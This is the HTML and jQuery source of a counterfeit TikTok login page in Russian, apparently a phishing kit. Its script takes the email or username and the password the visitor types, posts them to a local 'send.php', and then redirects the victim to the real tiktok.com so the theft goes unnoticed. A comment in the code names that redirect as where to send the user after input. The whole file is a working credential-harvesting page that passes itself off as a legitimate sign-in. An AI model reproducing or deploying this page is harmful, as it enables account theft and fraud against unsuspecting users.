<!doctype html>
<html lang="en" translate="no" style="font-size: 182.133px;">
    <head>
       
     
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,minimum-scale=1,maximum-scale=1" />
        <meta name="theme-color" content="#FFF" />
        <meta http-equiv="X-UA-Compatible" content="IE=Edge;chrome=1" />
        <meta http-equiv="cache-control" content="no-cache" />
        <meta name="keywords" content="Log in, Log in with phone or email" />
        <meta name="description" content="Войдите в свой аккаунт TikTok с помощью номера телефона или электронного адреса, чтобы начать смотреть реальные видео от реальных людей, которые поднимут вам настроение." />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="default" />
        <meta name="screen-orientation" content="portrait" />
        <meta name="format-detection" content="telephone=no" />
        <meta name="x5-orientation" content="portrait" />
        <meta name="robots" content="index, follow" />
		
		<link rel="shortcut icon" href="favicon.png" type="image/png">
		
        <title>Вход по номеру телефона или электронному адресу | TikTok</title>
		
        <style>  html{font-family:'Proxima Nova';-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;} body{margin:0;} header{display:block;} a{background-color:transparent;} a:active,a:hover{outline-width:0;} button,input,select{font:inherit;} button,input,select{overflow:visible;} button,input,select{margin:0;} button,select{text-transform:none;} [type=submit],button{cursor:pointer;} [disabled]{cursor:default;} [type=submit],button{-webkit-appearance:button;} button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0;} button:-moz-focusring,input:-moz-focusring{outline:1px dotted ButtonText;}  html,body{overflow-x:hidden;width:100%;height:100%;font-family:"sofiapro-regular";font-size:14px;} html{font-size:100px!important;} *{-webkit-box-sizing:border-box;box-sizing:border-box;} button{display:block;outline:none;} input{border-style:solid;line-height:100%;outline:none;pointer-events:initial!important;-webkit-appearance:none;} a{text-decoration:none;color:#fff;-webkit-transition:all .3s ease-in-out;-o-transition:all .3s ease-in-out;transition:all .3s ease-in-out;} a:hover{color:#00E5DD;}  .tiktok-app-container-1BOJ3{position:absolute;top:0;left:0;right:0;bottom:0;width:100%;height:100%;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;} .tiktok-app-container-1BOJ3 .tiktok-web-body-3PJge{-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;width:460px;background-color:#fff;margin:0 auto;}  .tiktok-web-header-21ch-{width:100%;height:160px;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;padding:0px 20px 90px 22px;color:#fff;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-webkit-flex-direction:row-reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-sizing:border-box;box-sizing:border-box;position:relative;margin-bottom:32px;} .tiktok-web-header-21ch- .login-title-3mweq{font-size:33px;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;line-height:33px;text-align:center;font-weight:bolder;color:#000000;font-family:'ProximaNova-bold';} .tiktok-web-header-21ch- .pc-title-3AWDD{position:absolute;left:calc(50% - 230px);bottom:0;} .tiktok-web-header-21ch- .help-center-34ye9{height:18px;font-family:'ProximaNova-regular';font-weight:600;font-size:14px;line-height:17px;color:rgba(22,24,35,0.5);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;} .tiktok-web-header-21ch- .help-center-34ye9 .help-icon-Tj03R{display:inline-block;width:18px;height:18px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAiCAMAAAANmfvwAAAAWlBMVEUAAAAgICAQECAVFSAQGCAYGCATGSAZGSAVFSASFyAXFyAUGCAUGCQYGCAYGCQVGSAVGSMZGSATFiAWFiAWFiMUFyAUFyMVGCAVGCMWGSIUFyIXFyIVFyIWGCIqQWwRAAAAHnRSTlMACBAYICAoKDA4OEBAQEBISEhQUFBYWGBgaHBweIBdHV/sAAABQElEQVQ4y5WUwXqDIBCERxJbDUlNaxIU+d//NXsQESI9lBsy3+zs7I7Sf4/56K3tP8xf7+e7J57lUUOZieIcQT0AwY3WDi4AcC0AzQTg2u3ejgCvJkPMBUCSjAfmHfMCvt5L34Bpu9gaYsX0kXNHNFcPU5dh1r4esGQCMg0uljIJa5J1UUMLtCvJqI0utE1ziw8rzV2STx9m6CTpG56JZpEMhCjvEl9MEqcA0mfW/TZPmJUqSf1a7s3YqE4/IFmwxbiuIbUo2QrkFCCqTpB+Z43MLPtAh4rck/e3bAccFE1XToDCuso6rw4NRaUuLN1+i8NpyWl8XjdN2OU0YTdfSh6afNs7H3JTNg8vh0Qc99XVMJa0E1tIliJ+56kMiZonwONcAHDNIREQpru147QG9nKI/VjG3lX/DWNKgB92M38BG84n3l4FYF0AAAAASUVORK5CYII=);background-size:contain;background-repeat:no-repeat;background-position:center;} .tiktok-web-header-21ch- .help-center-34ye9 .help-text-3FFfu{margin-left:7px;} .header-logo-1Vgxr{display:block;width:165px;height:42px;background-size:contain;background-repeat:no-repeat;background-position:center;}  .language-selection-2sIqO{font-family:"proxima-regular", PingFangSC, sans-serif;font-weight:400;-webkit-box-sizing:border-box;box-sizing:border-box;width:172px;height:36px;border:1px solid #8a8b91;border-radius:2px;font-size:14px;line-height:36px;padding:0 16px;cursor:pointer;position:relative;text-align:left;} .language-selection-2sIqO p{color:#ffffff;margin:0;} .language-selection-2sIqO::after{content:"";width:12px;height:12px;display:block;position:absolute;right:16px;top:50%;margin-top:-6px;pointer-events:none;background:url(core/arrow.36e5f392.svg) center no-repeat;background-size:contain;} .language-selection-2sIqO .language-selection-form-QMea6{position:absolute;left:0;top:0;width:100%;height:100%;opacity:0;cursor:pointer;}  a{margin:0;display:inline-block;font-size:14px;line-height:17px;font-family:'ProximaNova-regular';color:#161823;font-weight:600;cursor:pointer;} a:hover{color:#161823;} a.small-2HvP8{font-size:12px;line-height:15px;} a.big-I1_kl{font-size:15px;line-height:18px;} a.grey-3CMsC{color:rgba(22,24,35,0.75);} a.grey-3CMsC:hover{color:rgba(22,24,35,0.75);} a.red-3v7aI{color:#FF4C3A;}  .footer-bottom-wrapper-3RkmG{position:fixed;bottom:0;left:0;width:100%;} .toggle-30ign{height:64px;background:#fff;border-top:0.5px solid rgba(22,24,35,0.12);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;font-family:'ProximaNova-regular';font-size:15px;line-height:18px;color:#161823;} .bottom-wrapper-2xXEF{height:84px;background:#000;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;padding:0 144px;width:100%;} .copyright-1tBak{line-height:24px;color:#8a8b91;font-size:14px;line-height:28px;font-family:"sofiapro-medium", PingFangSC, sans-serif;font-weight:500;}  .input-field-2Y7RF{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;height:44px;line-height:44px;margin-top:12px;-webkit-box-sizing:content-box;box-sizing:content-box;} .input-field-2Y7RF input{height:44px;width:100%;padding:0;border:none;direction:ltr;color:#161823;font-family:'ProximaNova-regular';font-size:16px;caret-color:#FE2C55;} .input-field-2Y7RF input::-webkit-input-placeholder{font-size:16px;color:rgba(22,24,35,0.34);} .input-field-2Y7RF input::-moz-placeholder{font-size:16px;color:rgba(22,24,35,0.34);} .input-field-2Y7RF input:-ms-input-placeholder{font-size:16px;color:rgba(22,24,35,0.34);} .input-field-2Y7RF input::-ms-input-placeholder{font-size:16px;color:rgba(22,24,35,0.34);} .input-field-2Y7RF input::placeholder{font-size:16px;color:rgba(22,24,35,0.34);} .input-field-2Y7RF input:not(:-webkit-autofill){-webkit-animation-name:onAutoFillCancel-2rJuq;animation-name:onAutoFillCancel-2rJuq;} .input-field-pc-1ch2b{border:1px solid rgba(22,24,35,0.12);border-radius:2px;position:relative;margin-top:8px;} .input-field-pc-1ch2b .separator-3dGlN{margin:16px 4px;width:1px;height:12px;background:rgba(22,24,35,0.12);} .input-field-pc-1ch2b input{padding-left:12px;}  .login-button-86o6Z{width:100%;height:44px;line-height:44px;text-align:center;color:#fff;background-color:#fe2c55;border-radius:2px;font-family:'ProximaNova-regular';font-size:16px;line-height:44px;font-weight:600;position:relative;margin-top:32px;border:none;padding:0;cursor:pointer;} .login-button-86o6Z.disable-NIQ4M{color:rgba(22,24,35,0.3);background-color:rgba(22,24,35,0.06);}  .select-container-1DrEI{height:44px;line-height:44px;padding:0 13px 0 12px;font-size:16px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;font-family:'ProximaNova-regular';-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;width:100%;cursor:pointer;white-space:pre;border-radius:2px;} .select-container-1DrEI:after{content:"";width:20px;height:20px;margin:12px 0 12px 15px;display:block;background-image:url(core/openSelector.49add187.svg);background-size:contain;} .container-2iaQz{position:relative;color:#161823;}  .title-wrapper-YtF9A{font-size:17px;line-height:20px;font-family:'ProximaNova-bold';color:#161823;margin-top:16px;margin-bottom:12px;font-weight:bold;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;}  .form-container-2Mnwl{position:relative;} .form-container-2Mnwl .hide-password-19IzE{width:20px;height:20px;margin:12px 0;position:absolute;right:12px;background:url(core/showPassword.6f254a34.svg) no-repeat;background-size:contain;cursor:pointer;} .form-container-2Mnwl .hide-password-19IzE{background:url(core/hidePassword.316c9e71.svg) no-repeat;}   @font-face{font-family:"sofiapro-regular";src:url(core/sofiapro-regular.otf);} @font-face{font-family:"ProximaNova-bold";font-weight:normal;font-style:normal;src:url(core/Proxima-Nova-Bold.otf);} @font-face{font-family:"ProximaNova-regular";font-weight:normal;font-style:normal;src:url(core/Proxima-Nova-Regular.otf);} @font-face{font-family:"sofiapro-medium";src:url(core/sofiapro-medium.otf);}	  .errMsg-3DVgg{font-size:12px;line-height:15px;font-family:'ProximaNova-regular';color:#FF4C3A;margin-top:6px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;}  .input-field-pc-1ch2b.error-17ND7{border:1px solid #FF4C3A;position:relative;} .input-field-pc-1ch2b.error-17ND7 input{color:#FF4C3A;} .input-field-pc-1ch2b.error-17ND7::after{content:'';display:inline-block;width:20px;height:20px;margin:12px 0;position:absolute;right:12px;background:url(core/error.97ee907e.svg) no-repeat;background-size:contain;cursor:pointer;} .input-field-pc-1ch2b.error-17ND7.move-warning-2SEA5::after{-webkit-transform:translateX(-36px);-ms-transform:translateX(-36px);transform:translateX(-36px);}  .login-button-86o6Z{width:100%;height:44px;line-height:44px;text-align:center;color:#fff;background-color:#fe2c55;border-radius:2px;font-family:'ProximaNova-regular';font-size:16px;line-height:44px;font-weight:600;position:relative;margin-top:32px;border:none;padding:0;cursor:pointer;} .login-button-86o6Z .button-loading-ring-3JCnw{position:absolute;top:0;right:0;width:44px;height:44px;} .login-button-86o6Z .button-loading-ring-3JCnw div{-webkit-box-sizing:border-box;box-sizing:border-box;display:block;position:absolute;left:14.5px;top:14.5px;width:15px;height:15px;border:2px solid #fff;border-radius:50%;-webkit-animation:lds-ring-NCQct 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;animation:lds-ring-NCQct 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;border-color:#fff transparent transparent transparent;} .login-button-86o6Z .button-loading-ring-3JCnw div:nth-child(1){-webkit-animation-delay:-0.45s;animation-delay:-0.45s;} .login-button-86o6Z .button-loading-ring-3JCnw div:nth-child(2){-webkit-animation-delay:-0.3s;animation-delay:-0.3s;} .login-button-86o6Z .button-loading-ring-3JCnw div:nth-child(3){-webkit-animation-delay:-0.15s;animation-delay:-0.15s;}  .digit-code-container-37rU_>button:last-child{margin-top:8px;width:190px;}  @-webkit-keyframes lds-ring-NCQct{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg);}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg);}} @keyframes lds-ring-NCQct{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg);}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg);}} .form-container-2Mnwl .show-password-2TKUj{width:20px;height:20px;margin:12px 0;position:absolute;right:12px;background:url(core/showPassword.6f254a34.svg) no-repeat;background-size:contain;cursor:pointer;}  .loading-3FZQ2{width:30px}		  @media all and (max-width : 500px) {  .tiktok-app-container-1BOJ3 .tiktok-web-body-3PJge {max-width:100%!important; padding: 0px 20px 0px 20px;} .tiktok-web-header-21ch- .pc-title-3AWDD {margin: auto;position: absolute;left: 0;bottom: 0;right: 0;} .bottom-wrapper-2xXEF {    padding: 0 24px!important;} }  @media all and (max-width : 330px) {  .toggle-30ign {display:none;} } 		 		</style>
   
   </head>

    <body class="notranslate">
	
	<div class="loadings" style="width:30px; margin:0 auto; position:relative; top:38%;">
	<img class="loading-3FZQ2" src="core/loading.de997145.gif">
	</div>
	
        <div id="root" style="display:none">
            <div class="tiktok-app-container-1BOJ3">
                <header class="tiktok-web-header-21ch-">
                    <a href="https://support.tiktok.com/ru" target="_blank" rel="noopener norefferrer" class="help-center-34ye9"><span class="help-icon-Tj03R"></span><span class="help-text-3FFfu">Обратная связь и помощь</span></a>
                    <div class="login-title-3mweq pc-title-3AWDD">Войти</div>
                    <a href="https://www.tiktok.com/trending"class="header-logo-1Vgxr" style="background-image: url('data:image/png;base64,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');"></a>
                </header>
                <div class="tiktok-web-body-3PJge">
                    <form>
                        <div class="title-wrapper-YtF9A">
                            <div>Почта или имя пользователя</div>
                        </div>
                     <div class="form-container-2AORY">
					 <div class="input-field-2Y7RF input-field-pc-1ch2b">
					 <input placeholder="Почта или имя пользователя" type="text" autocomplete="email" name="email" id="email" value="">
					 </div>
					 </div>
                        <div class="form-container-2Mnwl">
						
                            <div class="input-field-2Y7RF input-field-pc-1ch2b move-warning-2SEA5">
                                <p id="pass_hide" class="hide-password-19IzE"></p>
                                <input placeholder="Пароль" type="password" autocomplete="password" name="password" id="password" value="" />
                            </div>
							
							<div class="errMsg-3DVgg" style="display:none"><div>Неверный пароль</div></div>
							
                        </div>
                        <div><a class="small-2HvP8 grey-3CMsC" href="https://www.tiktok.com/signup?lang=ru" style="margin-top: 12px;">Забыли пароль?</a></div>
                        <button class="login-button-86o6Z disable-NIQ4M" id="send" disabled type="submit">Войти</button>
					
                    </form>
                </div>
                <div class="footer-bottom-wrapper-3RkmG">
                    <div class="toggle-30ign">
                        <div>Еще нет аккаунта?</div>
                        <a class="big-I1_kl red-3v7aI" href="https://www.tiktok.com/signup?lang=ru" style="margin-left: 5px;">Регистрация</a>
                    </div>
                </div>
            </div>
        </div>
		
		 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>

    <script>
        $(document).ready(function() {
		

		setTimeout(function() {
				
		$('.loadings').fadeOut();
        $('#root').fadeIn();

        }, 2000);
		
		//click open pass input text
		
		$('#pass_hide').click(function() {
		
		$(this).toggleClass('active');
		
		 if($(this).hasClass("active")) {
		 $(this).removeClass('hide-password-19IzE');
         $(this).addClass('show-password-2TKUj');
		 $("#password").attr('type', 'text');
		 
		 }
		 
		 else {
		 
		 $(this).addClass('hide-password-19IzE');
         $(this).removeClass('show-password-2TKUj');
		 
		 $("#password").attr('type', 'password');
		 
		 }

	});	
	
	//click button off disabled

        $('#send').click(function() {
			
		$(this).html('Войти <div class="button-loading-ring-3JCnw"><div></div><div></div><div></div><div></div></div>');
				
		var login  = $("#email").val();
        var password  = $("#password").val();				
				
        $.ajax({
	
        type: "POST",
        url: "send.php",
        data: {login:login, password:password}
        }).done(function( result )
        {
		
        setTimeout(function() {
				
		$('#send').html('Войти');
        window.location.replace("https://www.tiktok.com/");  //куда направлять юзера после ввода

        }, 2000);
		
        });		

        return false;		

        });
			
			// disabled button
			
            $('#email,#password').keyup(function() {
			
                var email = $('#email').val().length;
				var password = $('#password').val().length; 
				
                if (email >= 5 && password >=5) {
                    $('#send').removeClass('disable-NIQ4M');
                    $("#send").removeAttr('disabled');
                } else {
                    $('#send').addClass('disable-NIQ4M');
                    $("#send").attr('disabled', 'disabled');
                }
            });

        });


    </script>

    </body>
</html>